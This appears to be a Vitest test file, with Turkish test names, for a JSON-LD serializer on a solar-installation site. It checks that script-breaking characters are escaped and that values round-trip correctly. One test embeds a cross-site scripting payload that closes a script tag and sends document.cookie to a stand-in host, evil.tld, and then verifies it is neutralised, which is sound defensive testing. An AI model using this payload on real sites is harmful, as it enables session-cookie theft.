import { describe, expect, it } from 'vitest'
import { serializeJsonLd } from './jsonLd'

describe('serializeJsonLd', () => {
  it('script tag\'inden çıkışa izin veren karakterleri kaçışlar', () => {
    const out = serializeJsonLd({ headline: 'Test' })
    expect(out).not.toContain('<')
    expect(out).not.toContain('>')
  })

  it('rapordaki saldırı payload\'ını zararsız hale getirir', () => {
    const payload = '</script><img src=x onerror="fetch(\'//evil.tld/c?c=\'+document.cookie)">'
    const out = serializeJsonLd({ headline: payload })
    expect(out).not.toContain('</script>')
    expect(out).not.toContain('<img')
    expect(out).toContain('\\u003c/script\\u003e')
  })

  it('& karakterini kaçışlar', () => {
    const out = serializeJsonLd({ description: 'A & B' })
    expect(out).not.toContain('A & B')
    expect(out).toContain('A \\u0026 B')
  })

  it('kaçışlamadan önceki ve sonraki değer JSON.parse ile aynı objeye döner (round-trip)', () => {
    const original = {
      '@type': 'BlogPosting',
      headline: 'Soma\'da GES <kurulumu> & bakımı',
      description: 'Test açıklaması',
    }
    const roundTripped = JSON.parse(serializeJsonLd(original))
    expect(roundTripped).toEqual(original)
  })

  it('normal Türkçe içeriği bozmadan geçirir', () => {
    const original = { headline: 'Çatı GES kurulumu şirketimizce İzmir\'de tamamlandı' }
    const roundTripped = JSON.parse(serializeJsonLd(original))
    expect(roundTripped).toEqual(original)
  })
})
